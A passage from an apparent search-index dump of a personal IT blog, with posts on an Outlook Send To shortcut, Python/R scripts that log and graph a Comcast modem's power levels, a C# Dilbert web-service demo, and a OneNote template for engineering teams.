e-mail.</p> <p>Below are a few steps to create a new Send To Mail Recipient context menu shortcut that address these issues:</p> <ol> <li>Right-Click the START button and select Explore</li> <li> <p>Select the Send To folder from the folder list on the left.</p> <p>Vista Users:  The Send To folder is located under: <code>%APPDATA%\\Microsoft\\Windows\\SendTo</code> Everything else should work the same. 3.  Right-Click anywhere in the white space to the right and select New, then Shortcut 4.  In the Type the location of the item: box, type in the following lines based on the version of Outlook you are using</p> <p>Outlook 2003:   \"C:Program Files\\Microsoft Office\\OFFICE11\\OUTLOOK.EXE\" /c ipm.note</p> <p>Outlook 2007:    \"C:Program Files\\Microsoft Office\\OFFICE12\\OUTLOOK.EXE\" /a 5.  In the Type a name for this shortcut: box type in: Outlook Mail Recipient 6.  Now when you right click on items to send as attachments you will have a new option. By selecting Outlook Mail Recipient you will get your new email in the default email format you have selected in Outlook and, if you have configured your signature for a new email, you will have it as well.</p> </li> </ol> <p>UPDATE: 02/10/2009 - It look like this method won't work when selecting multiple files. For a possible workaround try the following:</p> <p>Create a file sendto.js with the following code and save it somewhere on your system. For this example the file is saved to c:\\sendto.js. </p> <pre><code>try\n{\n    var args = WScript.Arguments;\n    var outlookApp = new ActiveXObject(\"Outlook.Application\");\n    var nameSpace = outlookApp.getNameSpace(\"MAPI\");\n    var mailFolder = nameSpace.getDefaultFolder(6);\n    var mailItem = mailFolder.Items.add('IPM.Note.FormA');\n\n    with(mailItem)\n    {\n        Subject=\"Sending Files\";\n\n        for (var i = 0; i &lt; args.length; i++)\n        {\n            Attachments.Add(args(i));\n        }\n\n        Display(0);\n    }\n}\ncatch(err){\n\n}\nfinally\n{\n    outlookApp = null;\n}\n</code></pre> <p>Follow the steps in the tutorial above, but in step 4 type this in the box instead: %windir%\\system32\\wscript.exe \"C:\\sendto.js\" </p> <p>Note: Use the \"Change Icon\" button on the same screen to manually change the icon and use the icons in the Outlook.exe file, otherwise you will get the wscript.exe icon.  </p> <p>Vista: To get to the Send To folder, you'll need to open up an Explorer window, and then paste the following into the address bar: %APPDATA%\\Microsoft\\Windows\\SendTo</p>","tags":["Windows","Outlook"]},{"location":"posts/ComcastModemMonitor/","title":"Comcast Modem Power Level Monitor","text":"<p>Published: 2019-11-19</p> <p>Below you'll find scripts to monitor a Comcast modem's power levels to help troubleshoot line problems.</p> <p>The power of this tool becomes apparent when you use the data gathered to maintain an event journal of everything that happens related to your connection.</p> <p>For example, for my business, everytime I show packet loss in my firewall I can corelate it to abnormal power levels in the modem. This is critical, not only to know that the problem lies outside of my control, but also to aide the Comcast technitians in fixing the issue. The graphs are especially usefull to show connection issues over time.</p>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#windows-subsystem-for-linux","title":"Windows Subsystem for Linux","text":"<p>Built-in linux system in Windows 10. You can run these scripts on any linux based system, but this was readily available and already on our existing network.</p>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#start-cron-ssh-at-windows-startup","title":"Start Cron &amp; SSH at Windows Startup","text":"<p>Short batch file <code>startup.bat</code> used by a scheduled task in Windows to start the ssh and cron daemons in WSL. This is useful in case the host comptuer is restarted. (Windows Updates restarts mainly...)</p> <pre><code>@echo off\n\nwsl -u root service ssh start\nwsl -u root service cron start\n\nexit\n</code></pre>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#ssh","title":"SSH","text":"<p>Having SSH installed in WSL makes it a lot easier to connect in and work on the script, check logs, etc.</p>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#cron","title":"Cron","text":"<ul> <li>Run the graph generating script every hour.</li> <li>At 1 min intervals, check the python script hasn't errored out. If it's not running, start it.</li> </ul> <pre><code>0 * * * * /home/user/scripts/comcast/cm_run.sh\n*/1 * * * * /home/user/scripts/comcast/keep_alive.sh\n</code></pre>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#cm_rushsh","title":"cm_rush.sh","text":"<p>Simple script to run the graph generating code. Could run R script directly from cron, but this allows other scripts to be called if needed.</p> <pre><code>#!/bin/bash\n\n~/scripts/comcast/comcastplot.R\n</code></pre>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#keep_alivesh","title":"keep_alive.sh","text":"<p>Script to check if the python code is running. If it isn't, it will restart it.</p> <pre><code>#!/bin/bash\n\nif ! pgrep -f 'cmpwrlevel2.py'\nthen\n    nohup $(which python3) ~/scripts/comcast/cmpwrlevel2.py &amp;\nfi\n</code></pre>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#modem-power-levels","title":"Modem Power Levels","text":"<p>Poll the modem every minute and log the upstream (U) and downstream (D) powerlevels.</p> <p>Acceptable ranges: (Note the DOCSIS 3.1, which is neede for higher speeds has lower tolerances.) https://www.dslreports.com/faq/16085</p>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#sample-data","title":"Sample Data","text":"<pre><code>2019-09-16 01:30:17 U 43.78 dBmV D 3.97 dBmV\n2019-09-16 01:31:18 U 43.78 dBmV D 3.97 dBmV\n2019-09-16 01:32:18 U 43.78 dBmV D 3.97 dBmV\n2019-09-16 01:33:18 U 43.78 dBmV D 3.96 dBmV\n2019-09-16 01:34:19 U 43.78 dBmV D 3.96 dBmV\n2019-09-16 01:35:18 U 43.78 dBmV D 4.03 dBmV\n2019-09-16 01:36:18 U 43.78 dBmV D 4.00 dBmV\n2019-09-16 01:37:18 U 43.78 dBmV D 3.98 dBmV\n2019-09-16 01:38:17 U 43.78 dBmV D 3.97 dBmV\n</code></pre>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#get-data-with-python","title":"Get Data With Python","text":"<p>Script to get the data. The modem is quite \"finicky\".</p> <pre><code>#!/usr/bin/python3\n\n# Comcast modem power levels reading script.\n# Author: Eugenio C.\n# Date: 09.16.2019\n\n# TODO: Rewrite this script into a module with calls to objects.\n# TODO: Put raw data in database. SQLite\n\n# Load libraries\nimport logging\nimport re\nimport smtplib\nimport datetime\nimport pickle\nimport pathlib\nimport os\nimport sys\nimport time\nimport statistics\nfrom email.message import EmailMessage\nfrom bs4 import BeautifulSoup as bs\nimport requests\n\nDATAFILE = 'cm_modem_pwr_levels.txt'\nWAIT_TIME = 60\n\n# ********************************************************************************\n# Function Declerations\n# ********************************************************************************\n\ndef send_text(msg_txt):\n    msg = EmailMessage()\n\n    msg.set_content(msg_txt)\n\n    msg['Subject'] = 'CM Alarm'\n    msg['From'] = 'python_script@yourdomain.com'\n    msg['To'] = 'phonenumber@vtext.com'\n\n    smtp = smtplib.SMTP('email.server.address')\n    smtp.send_message(msg)\n    smtp.quit()\n\n# ********************************************************************************\n# Main Script\n# ********************************************************************************\n\nownp = os.path.abspath(os.path.dirname(sys.argv[0]))\ntdnow = datetime.datetime.now().strftime(\"%Y%m%d\")\n\n# Setup Logging\nlogging.basicConfig(\n    format='%(asctime)s:%(levelname)s:%(message)s',\n    level=logging.DEBUG,\n    filename=ownp + '/cmpwrlevel2.log')\n\n\n# Get our \"browser\"\ns = requests.Session()\n\n# Reload cookies from previous session if they exist\nif pathlib.Path(ownp + '/cookiefile2').exists():\n    with open(ownp + '/cookiefile2', 'rb') as f:\n        s.cookies.update(pickle.load(f))\n\n# Set url and authentication\nurl = \"http://10.1.10.1/check.php\"\npayload = {\n    \"username\": \"cusadmin\", # Public, well known, customer-side, default credentials\n    \"password\": \"highspeed\"\n}\n\n# Set our regex\nregex = r'\"Please Login First\\!\\\"'\nmodemin = False\n\n# Login loop, tries to connect to the modem.\nwhile not modemin:\n    try:\n        # Login to set cookie\n        logging.info(\"Getting: %s\" % url)\n        r = s.post(url, data=payload)\n\n        logging.info(\"Status Code: %i\" % r.status_code)\n        r.raise_for_status()\n\n        if not re.search(regex, str(r.content)):\n            logging.info(\"Ok, we're in. Let's stay logged on and get data!\")\n\n            send_text(\"Logged on!\")\n\n            modemin = True\n        else:\n            logging.info(\"No Luck! Let's try again in 10 seconds.\")\n            time.sleep(10)\n\n    except Exception as e:\n        logging.error(e)\n\n# Save cookies\nwith open(ownp + '/cookiefile2', 'wb') as f:\n    pickle.dump(s.cookies, f)\n\n# Now we can access the page we need\nurl = \"http://10.1.10.1/comcast_network.php\"\n\ngetdata = True\n\n# Let's start the data loop\nwhile getdata:\n    try:\n        logging.info(\"Getting: %s\" % url)\n        r = s.get(url)\n\n        logging.info(\"Status Code: %i\" % r.status_code)\n        r.raise_for_status()\n\n        # Get the date/time close to the time we read the values\n        currentDT = datetime.datetime.now()\n\n        # Get the html\n        bs_content = bs(r.content, \"lxml\")\n\n        # Narrow the html down to the two tables\n        down_data = bs_content.find_all('table')[0].get_text()\n        up_data = bs_content.find_all('table')[1].get_text()\n\n        # Set our regex\n        regex = r\"[-0-9\\.]* dBmV\"\n\n        # Get the power levels\n        d_matches = re.finditer(regex, down_data, re.MULTILINE)\n        u_matches = re.finditer(regex, up_data, re.MULTILINE)\n\n        d_pwr_sum = []\n        u_pwr_sum = []\n\n        # For each power level remove the label and convert to a number\n        # Sum up all the power levels so we can divide later for the average\n        for d_matchNum, match in enumerate(d_matches, start=1):\n            d_pwr = float(match.group().replace(\" dBmV\", \"\"))\n            d_pwr_sum.append(d_pwr)\n\n        for u_matchNum, match in enumerate(u_matches, start=1):\n            u_pwr = float(match.group().replace(\" dBmV\", \"\"))\n            u_pwr_sum.append(u_pwr)\n\n        # Print info to log file\n        logging.info(\"DW: {}\".format(','.join(map(str, d_pwr_sum))))\n        logging.info(\"DW: H%.1f, L%.1f, M%.1f, A%.2f\" %\n                     (max(d_pwr_sum),\n                      min(d_pwr_sum),\n                      statistics.median(d_pwr_sum),\n                      statistics.mean(d_pwr_sum)))\n\n        logging.info(\"UP: {}\".format(','.join(map(str, u_pwr_sum))))\n        logging.info(\"UP: H%.1f, L%.1f, M%.1f, A%.2f\" %\n                     (max(u_pwr_sum),\n                      min(u_pwr_sum),\n                      statistics.median(u_pwr_sum),\n                      statistics.mean(u_pwr_sum)))\n\n        # Calculate the averages\n        avg_u_pwr = statistics.mean(u_pwr_sum)\n        avg_d_pwr = statistics.mean(d_pwr_sum)\n\n        # If the power levels are outside of spec, send an alert text message\n        if (avg_u_pwr &gt; 49) or (avg_u_pwr &lt; 40) or (avg_d_pwr &gt; 10) or (avg_d_pwr &lt; -10):\n            send_text(\"U%.2f D%.2f\" % (avg_u_pwr, avg_d_pwr))\n\n        # Write data to file\n        logging.info(\"Writing data to: %s\" % DATAFILE)\n        with open(DATAFILE, 'a') as o:\n            o.write(\n                \"%s U %.2f dBmV D %.2f dBmV\\n\" %\n                (currentDT.strftime(\"%Y-%m-%d %H:%M:%S\"),\n                 avg_u_pwr,\n                 avg_d_pwr))\n\n        logging.info(\"Waiting %i seconds.\" % (WAIT_TIME))\n        time.sleep(WAIT_TIME)\n\n    except Exception as e:\n        logging.error(e)\n\n        send_text(\"Exception!\")\n\n        with open(ownp + '/content.html', 'w+') as h:\n            h.write(r.text)\n\n        # Exit loop, cron will restart\n        getdata = False\n</code></pre>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#sample-graphs","title":"Sample Graphs","text":"","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#downstream-power-levels","title":"Downstream Power Levels","text":"","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#upstream-power-levels","title":"Upstream Power Levels","text":"","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#historical-graphs","title":"Historical Graphs","text":"<p>This is where you can really show line issues over time. You can see why we had random drops at the begging of the graph. Some variance is expected on power levels, especially due to  temperature, but no mor than 2-3 decibels. </p> <p>You can see where Comast finally fixed the issue. You can also see where we added back our splitter  for the TV.</p> <p>Note: the gaps in the line is missing data. The modem sometimes does not repond to web requests.  After some time, it will now allow web logins, yet somehow, with the python script and reusing cookies we are allowed in to collect data. Some times the page will refresh without the signal levels. Other times, during line problems the page will not be available. </p> <p>Click here to see the full image... </p> <p>Click here to see the full image... </p>","tags":["Python","R","Programming"]},{"location":"posts/ComcastModemMonitor/#generate-graphs-with-r","title":"Generate Graphs With R","text":"<pre><code>#!/usr/bin/env Rscript\n\n# Comcast modem power levels plotting script.\n# Author: Eugenio Cilento\n# Date: 09.16.2019\n\n# Load libraries\nlibrary(ggplot2, warn.conflicts = FALSE)\nlibrary(scales, warn.conflicts = FALSE)\nlibrary(ggrepel, warn.conflicts = FALSE)\nlibrary(lubridate, warn.conflicts = FALSE)\nlibrary(dplyr, warn.conflicts = FALSE)\n\nconsts &lt;- list(img_w = 14,\n    img_h = 8.5,\n    img_dpi = 320,\n    img_q = 30,\n    days = 6)\n\n# ***************************************************************************************\n# Get the data, clean it up and get it ready for use in the graph.\n# ***************************************************************************************\n\n# Read in the modem power levels from the text file.\npwr &lt;- read.table(\"cm_modem_pwr_levels.txt\")\n\npwr = pwr[c(-3,-5,-6,-8)] # Remove uneeded columns.\n\ncolnames(pwr) = c(\"Date\",\"Time\",\"UP\",\"DW\") # Let's give the columns some names.\n\npwr$DateTime &lt;- paste(pwr$Date, pwr$Time) # Create a new timstamp column.\n\n# Create a new column used for the facets. Basically to show the Days on the graph.\npwr$Dow &lt;- strptime(pwr$DateTime, \"%Y-%m-%d\")\npwr$Dow &lt;- format(pwr$Dow, \"%m-%d %a\")\n\npwr = pwr[c(-1,-2)] # Some more cleanup.\n\n# Make that column an actual date time field\npwr$DateTime &lt;- strptime(pwr$DateTime, \"%Y-%m-%d %H:%M:%S\")\npwr$DateTime &lt;- as.POSIXct(pwr$DateTime, tz = \"America/Chicago\") # Convert to POSIXct type\n\npwr &lt;- pwr[pwr$DateTime &gt;= as.POSIXct(Sys.Date()-consts$days),] # Limit the data.\n\n# When did the modem signal go outside of the acceptable range?\npwrovr &lt;- pwr[which(pwr[,1] &gt; 49 | pwr[,1] &lt; 35 ),]\n\n# Dataframe for ranges\ndmax &lt;- pwr %&gt;% group_by(Dow) %&gt;% summarise(Max = max(DateTime))\ndmin &lt;- pwr %&gt;% group_by(Dow) %&gt;% summarise(Min = min(DateTime))\ndminmax &lt;- merge(dmax,dmin,by = \"Dow\")\n\n# Put in variables so we dont have to repeat code\ndta = as.POSIXct(Sys.Date())\ndtw = format(as.POSIXct(Sys.Date()), \"%m-%d %a\")\n\n# ***************************************************************************************\n# Beginning of the UPSTREAM graph script.\n# ***************************************************************************************\n\n# Dataframe for text labels for ranges\ntext_ann &lt;- data.frame(UP = 49, DW = 5,\n  lab = \"Packet Loss\\nBegins: +49\", DateTime = dta, Dow = dtw)\n\ntext_ann &lt;- rbind(text_ann, \n  data.frame(UP = 35, DW = 5, \n    lab = \"Recommended:\\n+ 35 - 47\", DateTime = dta, Dow = dtw))\n\nhour(text_ann$DateTime) = 2 #position of text within facet\n\n# Create the plot\ngg &lt;- ggplot(pwr, aes(DateTime, UP)) +\n  geom_point( # Points on a graph seem to work best for this type data.\n    color = \"black\",\n    size = .1\n  ) + \n  facet_grid( # This gives the days in a nice column.\n    col = vars(Dow),\n    labeller = labeller(Dow = label_wrap_gen(5)), # Word rap the labels.\n    space = 'free', \n    scales = 'free', \n    switch = 'x'\n  ) +\n  labs( # Needs some good titles and labels to make it easier to understand.\n    title=\"Cable Modem Upstream Power\", \n    subtitle=\"Comcast Business Internet\", \n    y=\"Upstream Power Level (dBmV)\", \n    x=\"Time (Date &amp; Hour in 24Hr format)\", \n    caption= paste( # Timestamp the graph.\n      \"International Assurance of TN, Inc. IT Department -\",\n      Sys.time()\n    )\n  ) +\n  geom_rect( # color the acceptable range so it stands out.\n    data = dminmax, \n    aes(\n      xmin = Min, \n      xmax = Max, \n      ymin = 35, \n      ymax = 47), \n    alpha = 0.2, \n    fill=\"green\", \n    inherit.aes = FALSE\n  ) +\n  geom_rect( # color the acceptable range so it stands out.\n    data = dminmax, \n    aes(\n      xmin = Min, \n      xmax = Max, \n      ymin = 47, \n      ymax = 49), \n    alpha = 0.2, \n    fill=\"red\", \n    inherit.aes = FALSE\n  ) +\n  geom_text( # add labels for the ranges\n    data = text_ann, \n    aes(x=DateTime, y=UP, label=lab), \n    vjust=-.2,\n    hjust=0,\n    size=2.5,\n    color= \"black\"\n  ) +\n  geom_hline(yintercept=49, linetype=\"dashed\", color = \"red\") +\n  geom_hline(yintercept=47, linetype=\"dashed\", color = \"green\") +\n  geom_hline(yintercept=35, linetype=\"dashed\", color = \"green\") +\n  coord_cartesian( # Set the y scale. The range of modem signal levels.\n    ylim = c(0, 60)\n  ) +\n  scale_y_continuous( # Set where the lines show on the graph.\n    minor_breaks = seq(0 , 60, 1), \n    breaks = seq(0, 60, 10)\n  ) +\n  scale_x_datetime( # Set the x scale based on the hour of the day.\n    breaks = pretty_breaks(), # Makes the hours fit nicely in a day.\n    expand = c(0, 0), # Brings the panel/facets together, seamless transition from day to day.\n    labels = date_format(\"%H\", tz = Sys.timezone(location = TRUE)), \n    date_breaks = \"2 hour\",\n    date_minor_breaks = \"1 hour\"\n  ) + \n  theme_bw() + # Start off with a base theme, then modify it.\n  theme(\n    panel.border = element_rect(\n      color = \"dark gray\"),\n    panel.spacing.x = unit(0,\"line\"),\n    strip.placement = \"outside\",\n    strip.text.x = element_text(\n      size = 6\n    ),\n    panel.grid.major = element_line(\n      color = \"light gray\"),\n    panel.grid.minor = element_line(\n      color = \"light gray\"\n    ),\n    axis.text.x = element_text( # Hour of the day\n      size = 6,\n      angle = 90,\n      vjust = 0.5,\n      hjust = 0.5),\n    axis.line = element_line( # Make the axis stand out.\n      color = \"darkblue\", \n      size = 1, \n      linetype = \"solid\")\n  ) \n\nif (dim(pwrovr)[1] != 0) { # Make sure we have out of range plots before adding them \n  gg = gg +\n    geom_text_repel( # Label the out-of-range plots\n      aes(label = paste(hour(DateTime),\":\", minute(DateTime),\"-\",UP)), \n      pwrovr,\n      size = 2,\n      color = \"red\"\n    )\n}\n\n# Save the graph to a JPEG file. High resolution allows more clarity and printability.\nggsave(\"cm_modem_up_pwr_levels.jpg\", \n       width = consts$img_w, \n       height = consts$img_h, \n       dpi = consts$img_dpi,\n       quality = consts$img_q,\n       limitsize = FALSE)\n\n# ***************************************************************************************\n# Beginning of the DOWNSTREAM graph script.\n# ***************************************************************************************\n\n# Dataframe for text labels for  ranges\ntext_ann2 &lt;- data.frame(UP = -6, DW = 5,\n  lab = \"Recommended:\\n-7 to 7\", DateTime = dta, Dow = dtw)\n\ntext_ann2 &lt;- rbind(text_ann2, \n  data.frame(UP = -9, DW = 5, \n    lab = \"Acceptable:\\n+- 7 to 10\", DateTime = dta, Dow = dtw))\n\ntext_ann2 &lt;- rbind(text_ann2, \n  data.frame(UP = -14, DW = 5, \n    lab = \"Maximum:\\n+- 10 to 15 \", DateTime = dta, Dow = dtw))\n\ntext_ann2 &lt;- rbind(text_ann2, \n  data.frame(UP = -18, DW = 5, \n    lab = \"Out of Spec:\\n&gt; +-15 \", DateTime = dta, Dow = dtw))\n\nhour(text_ann2$DateTime) = 2 #position of text within facet\n\n# Filter into a new table the out-of-range instances.\npwrovr &lt;- pwr[which(pwr[,2] &gt; 10 | pwr[,2] &lt; -10 ),]\n\n# Generate the downstream graph. Identical to upstream but with different ranges.\ngg &lt;- ggplot(pwr, aes(DateTime, DW)) +\n  geom_point(\n    color = \"black\",\n    size = .1\n  ) +\n  facet_grid(\n    col = vars(Dow),\n    labeller = labeller(Dow = label_wrap_gen(5)),\n    space = 'free', \n    scales = 'free', \n    switch = 'x'\n  ) +\n  coord_cartesian(\n    ylim = c(-30, 20)\n  ) +\n  scale_y_continuous(\n    minor_breaks = seq(-30 , 20, 1), \n    breaks = seq(-30, 20, 10)\n  ) +\n  labs(\n    title=\"Cable Modem Downstream Power\",\n    subtitle=\"Comcast Business Internet\",\n    y=\"Downstream Power Level (dBmV)\",\n    x=\"Time (Date &amp; Hour in 24Hr format)\",\n    caption= paste(\n      \"International Assurance of TN, Inc. IT Department -\",\n      Sys.time()\n    )\n  ) +\n  geom_text( # write the labels for the ranges\n    data = text_ann2, \n    aes(x=DateTime, y=UP, label=lab), \n    vjust=.3,\n    hjust=0,\n    size=2.5,\n    color= \"black\"\n  ) +\n  geom_hline(yintercept=-15, linetype=\"dashed\", color = \"red\") +\n  geom_hline(yintercept=-10, linetype=\"dashed\", color = \"yellow\") +\n  geom_hline(yintercept=-7, linetype=\"dashed\", color = \"green\") +\n  geom_hline(yintercept=7, linetype=\"dashed\", color = \"green\") +\n  geom_hline(yintercept=10, linetype=\"dashed\", color = \"yellow\") +\n  geom_hline(yintercept=15, linetype=\"dashed\", color = \"red\") +\n  geom_rect( # color the acceptable range so it stands out.\n    data = dminmax, \n    aes(\n      xmin = Min, \n      xmax = Max, \n      ymin = -7, \n      ymax = 7), \n    alpha = 0.2, \n    fill=\"green\", \n    inherit.aes = FALSE\n  ) +\n  geom_rect( # color the acceptable range so it stands out.\n    data = dminmax, \n    aes(\n      xmin = Min, \n      xmax = Max, \n      ymin = -10, \n      ymax = -7), \n    alpha = 0.2, \n    fill=\"yellow\", \n    inherit.aes = FALSE\n  ) +\n  geom_rect( # color the acceptable range so it stands out.\n    data = dminmax, \n    aes(\n      xmin = Min, \n      xmax = Max, \n      ymin = 7, \n      ymax = 10), \n    alpha = 0.2, \n    fill=\"yellow\", \n    inherit.aes = FALSE\n  ) +\n   geom_rect( # color the acceptable range so it stands out.\n    data = dminmax, \n    aes(\n      xmin = Min, \n      xmax = Max, \n      ymin = -15, \n      ymax = -10), \n    alpha = 0.2, \n    fill=\"red\", \n    inherit.aes = FALSE\n  ) +\n  geom_rect( # color the acceptable range so it stands out.\n    data = dminmax, \n    aes(\n      xmin = Min, \n      xmax = Max, \n      ymin = 10, \n      ymax = 15), \n    alpha = 0.2, \n    fill=\"red\", \n    inherit.aes = FALSE\n  ) +\n  scale_x_datetime(\n    breaks = pretty_breaks(),\n    expand = c(0, 0),\n    labels = date_format(\"%H\", tz = Sys.timezone(location = TRUE)),\n    date_breaks = \"2 hour\",\n    date_minor_breaks = \"1 hour\"\n  ) +\n  theme_bw() +\n  theme(\n    panel.border = element_rect(\n      colour = \"dark gray\"),\n    panel.spacing.x = unit(0,\"line\"),\n    strip.placement = \"outside\",\n    strip.text.x = element_text(\n      size = 6\n    ),\n    panel.grid.major = element_line(\n      colour = \"light gray\"),\n    panel.grid.minor = element_line(\n      color = \"light gray\"\n    ),\n    axis.text.x = element_text(\n      size = 6,\n      angle = 90,\n      vjust = 0.5,\n      hjust = 0.5),\n    axis.line = element_line(\n      colour = \"darkblue\", \n      size = 1, \n      linetype = \"solid\")\n  )\n\nif (dim(pwrovr)[1] != 0) {  # Make sure we have out of range before plotting\n  gg = gg +\n    geom_text_repel( # Label the out-of-range plots\n      aes(label = paste(DateTime, \"-\", DW, \"dBmV\")),\n      pwrovr,\n      size = 2,\n      color = \"red\"\n    )\n}\n\n# Save graph to file.\nggsave(\"cm_modem_dwn_pwr_levels.jpg\", \n       width = consts$img_w, \n       height = consts$img_h, \n       dpi = consts$img_dpi,\n       quality = consts$img_q,\n       limitsize = FALSE)\n</code></pre>","tags":["Python","R","Programming"]},{"location":"posts/DilbertSyncAsync/","title":"C# .NET 2.0 Web Service - Sync + Async","text":"<p>Published: 2007-10-19</p> <p> Git Repository</p> <p>I wanted to learn how to use web services in .NET with C#, so I created this tiny program that goes out and gets the \"Dilbert of the Day\" comic strip and puts it on your desktop in the form of a jpeg file.</p> <p>There are two versions to this program. One calls the web service synchronously, while the other calls the web services asynchronously. Synchronous calls are what most programmers would be familiar with. When a synchronous function/method is called it doesn't return control back to the calling program until it's finished, while an asynchronous function/method returns control immediately while it runs in a separate thread. </p> <p>The synchronous version of this program is much simpler than the asynchronous version, but the later allows for more flexibility. For example, in the asynchronous version the program can display a progress indicator while it's waiting for the call to complete.</p> <p>You could use the synchronous call to the web service and put it in a separate thread yourself. You would achieve the same result as the asynchronous call. It just makes the code a little longer and slightly more complex. </p>","tags":["NET","C#","Programming"]},{"location":"posts/DilbertSyncAsync/#synchronous-code","title":"Synchronous Code","text":"<pre><code>using System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.Threading;\nusing System.IO;\nusing System.Drawing;\nusing System.Drawing.Imaging;\nusing DilbertADay.com.esynaps.www;\n\nnamespace DilbertADay\n{\n    class Program\n    {\n        public static void Main(string[] args)\n        {\n            DailyDilbert wsDd;\n            Byte[] imageData;\n            MemoryStream strm;\n            Bitmap bmp;           \n\n            try\n            {\n                wsDd = new DailyDilbert();\n                imageData = wsDd.DailyDilbertImage();\n                strm = new MemoryStream(imageData);\n                bmp = new Bitmap(strm);\n                bmp.Save(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)\n                    + \"\\\\dilbert.jpg\",ImageFormat.Jpeg);\n                bmp.Dispose();\n                strm.Close();\n                wsDd.Dispose();\n            }\n            catch (Exception ex)\n            {\n                Console.Write(ex.Message);\n            }\n        }\n    }\n}\n</code></pre>","tags":["NET","C#","Programming"]},{"location":"posts/DilbertSyncAsync/#asynchronous-code","title":"Asynchronous Code","text":"<pre><code>using System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.Threading;\nusing System.IO;\nusing System.Drawing;\nusing System.Drawing.Imaging;\nusing DilbertADay.com.esynaps.www;\n\nnamespace DilbertADay\n{\n    class Program\n    {\n        public static int isCompleted = 0;\n        public static Byte[] imgData;\n        public static int timeout = 10000;\n\n        public static void Main(string[] args)\n        {\n            DailyDilbert wsDd;\n            MemoryStream strm;\n            Bitmap bmp;\n\n            int start, currentSecond;\n\n            try\n            {\n                wsDd = new DailyDilbert();\n                wsDd.DailyDilbertImageCompleted += new DailyDilbertImageCompletedEventHandler(\n                    Program.DailyDilbertImageCompleted_Handler);\n                wsDd.DailyDilbertImageAsync();\n\n                start = DateTime.Now.Millisecond;\n                currentSecond = start;\n\n                Console.WriteLine(\"Sending request\");\n                while (Program.isCompleted == 0 &amp;&amp; (currentSecond - start) &lt; Program.timeout)\n                {\n                    if (currentSecond &lt; DateTime.Now.Millisecond)\n                    {\n                        currentSecond = DateTime.Now.Millisecond;\n                        Console.Write(\".\");\n                    }\n                }\n                Console.Write(\"\\n\");\n\n                if (Program.isCompleted == 1)\n                {\n                    Console.WriteLine(\"Generating image\");\n                    strm = new MemoryStream(Program.imgData);\n                    bmp = new Bitmap(strm);\n                    bmp.Save(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)\n                        + \"\\\\dilbert.jpg\", ImageFormat.Jpeg);\n\n                    bmp.Dispose();\n                    strm.Close();\n                    wsDd.Dispose();\n                }\n            }\n            catch (Exception ex)\n            {\n                Console.Write(ex.Message);\n            }\n        }\n\n        public static void DailyDilbertImageCompleted_Handler(object sender, DailyDilbertImageCompletedEventArgs args)\n        {\n            try\n            {\n                Program.imgData = args.Result;\n                Program.isCompleted = 1;\n            }\n            catch (Exception ex)\n            {\n                Console.Write(ex.Message);\n                Program.isCompleted = 2;\n            }\n        } \n    }\n}\n</code></pre>","tags":["NET","C#","Programming"]},{"location":"posts/EngTeamTemplate/","title":"A OneNote Template for Engineering Teams","text":"<p>Published: 2025-09-30</p>","tags":["OneNote","Teamwork","Organization"]},{"location":"posts/EngTeamTemplate/#a-onenote-template-for-it-engineering-teams","title":"A OneNote Template for IT Engineering Teams","text":"<p>IT Engineering teams thrive when information is easy to find, share, and update. Too often, knowledge gets scattered across emails, chat threads, personal notes - or worse, it never gets written down at all. To address this, I created a OneNote template that serves as a single, organized knowledge base for the team.  </p> <p>This template balances technical documentation, meeting notes, troubleshooting guides, and upgrade processes, all within a structure that is intuitive and easy to maintain.  </p>","tags":["OneNote","Teamwork","Organization"]},{"location":"posts/EngTeamTemplate/#why-notes-matter","title":"Why Notes Matter","text":"<p>Notes are the backbone of an efficient engineering team. Good documentation allows each member to work in their area of expertise while still staying in sync with the rest of the team. Members act as Subject Matter Experts (SMEs) in different technologies, while still ensuring that the entire team can step in, contribute, and understand when needed. </p> <p>Well-written notes make it possible to:</p> <ul> <li>Share knowledge quickly and clearly  </li> <li>Avoid re-learning the same lessons individually  </li> <li>Speed up problem-solving and onboarding  </li> <li>Allow each team member to work more independently while still being part of the whole  </li> <li>Enable the team to handle a larger workload at once  </li> <li>Provide a living runbook for troubleshooting and upgrades  </li> <li>Improve compliance and audit readiness  </li> </ul> <p>Effective note-taking is a skill!</p> <p>Like any skill, it takes practice, learning, and consistent effort to develop. In a corporate environment, it also requires leadership support - both to recognize its value and to create the time and space for it to happen.  </p>","tags":["OneNote","Teamwork","Organization"]},{"location":"posts/EngTeamTemplate/#three-simple-concepts-for-better-notes","title":"Three Simple Concepts for Better Notes","text":"","tags":["OneNote","Teamwork","Organization"]},{"location":"posts/EngTeamTemplate/#1-capture-what-others-need","title":"1. Capture What Others Need","text":"<ul> <li>Ask: \u201cWhat steps would another engineer need to follow to get the same result? or \u201cHow would I explain this so a new teammate could do it on their own?\u201d </li> <li>Include both overview (awareness, context, background) and details (step-by-step).  </li> <li>Don\u2019t forget screenshots where helpful.  </li> </ul>","tags":["OneNote","Teamwork","Organization"]},{"location":"posts/EngTeamTemplate/#2-organize-the-hierarchy","title":"2. Organize the Hierarchy","text":"<ul> <li>Think table of contents: what will the structure look like once you\u2019re finished?  </li> <li>Start messy if needed, then come back later to reorganize.  </li> <li>Keep a logical flow so notes can actually be followed.  </li> </ul>","tags":["OneNote","Teamwork","Organization"]},{"location":"posts/EngTeamTemplate/#3-keep-it-updated","title":"3. Keep It UpdatedAlertsArchitectureCertificatesLicensingLoggingMeetingsOwnerRecurring Requests / TasksReportingScenariosTech Notes (tn)TrainingTroubleshooting / IncidentsUpgradesVendor Infoz-Archives.old","text":"<ul> <li>If you learn something new or something changes, update.  </li> <li>Use the date under the page title to keep track of the latest version.  